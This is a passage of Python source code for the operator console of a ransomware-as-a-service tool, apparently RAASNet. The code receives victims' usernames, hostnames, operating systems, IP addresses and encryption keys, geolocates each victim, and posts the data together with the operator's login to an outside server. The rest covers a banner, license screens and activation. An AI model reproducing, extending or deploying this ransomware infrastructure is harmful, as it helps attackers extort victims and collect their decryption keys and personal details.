[Continent]  -> %s
[Country]    -> %s
[Region]     -> %s
[City]       -> %s
[ISP]        -> %s
[ZIP]        -> %s

''' % (time.strftime('%d/%m/%Y'),
        time.strftime('%X'),
        user,
        system,
        hostname,
        key,
        ip,
        local,
        con,
        country,
        region,
        city,
        isp,
        zip)

                            self.serv.options['log'].insert(END, result, 'yellow')
                            self.serv.options['log'].see(END)

                            if system == 'Windows':
                                co = self.serv.options['win']['text'] + 1
                                self.serv.options['win']['text'] = co
                            elif system == 'Darwin':
                                co = self.serv.options['mac']['text'] + 1
                                self.serv.options['mac']['text'] = co
                            elif system == 'Linux':
                                co = self.serv.options['linux']['text'] + 1
                                self.serv.options['linux']['text'] = co
                            else:
                                co = self.serv.options['other']['text'] + 1
                                self.serv.options['other']['text'] = co


                            #if save_keys == 1:
                            payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip, 'lat' : lat, 'lon' : lon}
                            r = requests.post('https://zeznzo.nl/post.py', data=payload)
                        else:
                            break

                except Exception as e:
                    print(e)
                finally:
                    sockfd.close()

        except Exception as e:
            pass


        self.server_socket.close()

    def close_server_by_click(self):
        self.server_socket.close()
        self.serv.destroy()

    def insert_banner(self):
        banner = '''
                         .:'                                  `:.
                         ::'                                    `::
                        :: :.                                  .: ::
                         `:. `:.             .             .:'  .:'
                          `::. `::           !           ::' .::'
                              `::.`::.    .' ! `.    .::'.::'
                                `:.  `::::'':!:``::::'   ::'
                                :'*:::.  .:' ! `:.  .:::*`:
                               :: HHH::.   ` ! '   .::HHH ::
                              ::: `H TH::.  `!'  .::HT H' :::
                              ::..  `THHH:`:   :':HHHT'  ..::
                              `::      `T: `. .' :T'      ::'
                                `:. .   :         :   . .:'
                                  `::'               `::'
                                    :'  .`.  .  .'.  `:
                                    :' ::.       .:: `:
                                    :' `:::     :::' `:
                                     `.  ``     ''  .'
                                      :`...........':
                                      ` :`.     .': '
                                       `:  `"""'  :'
         ______   _______  _______  _______  _                 _______  _______  _______
        (  __  \ (  ____ \(       )(  ___  )( (    /||\     /|(  ___  )(  ____ )(  ____ \\
        | (  \  )| (    \/| () () || (   ) ||  \  ( || )   ( || (   ) || (    )|| (    \/
        | |   ) || (__    | || || || |   | ||   \ | || | _ | || (___) || (____)|| (__
        | |   | ||  __)   | |(_)| || |   | || (\ \) || |( )| ||  ___  ||     __)|  __)
        | |   ) || (      | |   | || |   | || | \   || || || || (   ) || (\ (   | (
        | (__/  )| (____/\| )   ( || (___) || )  \  || () () || )   ( || ) \ \__| (____/\\
        (______/ (_______/|/     \|(_______)|/    )_)(_______)|/     \||/   \__/(_______/
        '''

        self.serv.options['log'].insert('1.0', banner + '\n', 'red')

    def get_ip_data(self, ip):
        url = 'http://ip-api.com/json/%s?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,query' % ip
        try:
            r = requests.get(url, timeout = 5)
        except Exception as e:
            con = 'Error - Fail'
            country = 'Error - Fail'
            region = 'Error - Fail'
            city = 'Error - Fail'
            isp = 'Error - Fail'
            zip = 'Error - Fail'
            lat = 'Error - Fail'
            lon = 'Error - Fail'
            return '%s,%s,%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip, lat, lon)


        data = r.json()

        if r.status_code == 200 and data['status'] == 'success':
            con = data['continent'] + ' (' + data['continentCode'] + ')'
            country = data['country'] + ' (' + data['countryCode'] + ')'
            region = data['regionName']
            city = data['city']
            isp = data['isp'].replace(',', '')
            zip = data['zip']
            lat = data['lat']
            lon = data['lon']
        else:
            con = 'Error - Fail'
            country = 'Error - Fail'
            region = 'Error - Fail'
            city = 'Error - Fail'
            isp = 'Error - Fail'
            zip = 'Error - Fail'
            lat = 'Error - Fail'
            lon = 'Error - Fail'

        return '%s,%s,%s,%s,%s,%s,%s,%s' % (con, country, region, city, isp, zip, lat, lon)

    def close_profile(self, event):
        self.prof.destroy()

    def close_exploit(self, event):
        self.exp.destroy()

    def close_server(self, event):
        self.server_socket.close()
        self.serv.destroy()

    def close_compile(self, event):
        self.comp.destroy()

    def close_generate(self, event):
        self.gen.destroy()

    def close_set_msg(self, event):
        self.message.destroy()

    def close_set_target_ext(self, event):
        self.extentions.destroy()

    def close_set_target_dirs(self, event):
        self.dirs.destroy()

    def open_github(self):
        webbrowser.open_new_tab('https://www.github.com/leonv024/RAASNet')

    def open_buy(self):
        webbrowser.open_new_tab('https://www.zeznzo.nl/')

    def exit(self):
        sys.exit(0)

    def exit_event(self, event):
        exit(0)

    def activate(self):
        key = password(text='Please enter your activation key', title='Enter Key')
        if key == None:
            messagebox.showwarning('Error', 'No key given. Canceled...')
            return

        self.check_activation(key)

    def show_license(self):
        self.withdraw()

        try:
            license = open('./LICENSE', 'r').read()
        except FileNotFoundError:

            messagebox.showwarning('ERROR', 'This product comes with a license but the license was not found in your installation directory.\n\nPlease, download this product from the official source only!')
            sys.exit(1)

        self.lic = Toplevel()
        self.lic.title(string = 'LICENSE AGREEMENT')
        self.lic.configure(background = 'white')
        self.lic.resizable(0,0)

        self.options['license'] = Text(self.lic, height = 25, width = 80)
        self.options['license'].grid(row = 0, column = 0, columnspan = 2)
        decline = HoverButton(self.lic, text = 'DECLINE', command = self.decline_license, width = 25).grid(row = 1, column = 0)
        agree = HoverButton(self.lic, text = 'AGREE', command = self.agree_license, width = 25).grid(row = 1, column = 1)

        self.options['license'].insert('1.0', license)

    def decline_license(self):
        messagebox.showwarning('DECLINED', 'You rejected the license.\n\nYou are not allowed to use this software.\n\nRelaunch it and click "agree" if you changed your mind.\n\nThis program will now exit... Goodbye!')
        sys.exit(0)

    def agree_license(self):
        f = open(sys.argv[0], 'r').read()
        f = f.replace("#<activate>", "self.options['agreed'].set(1)", 1)
        with open(sys.argv[0], 'w') as w:
            w.write(f)
            w.close()

        self.deiconify()
        self.lic.destroy()

    def view_license(self):
        messagebox.showinfo('License', 'Software: Free (Public Test)\nLicense: GNU General Public License v3.0')

logon = Login()
logon.mainloop()
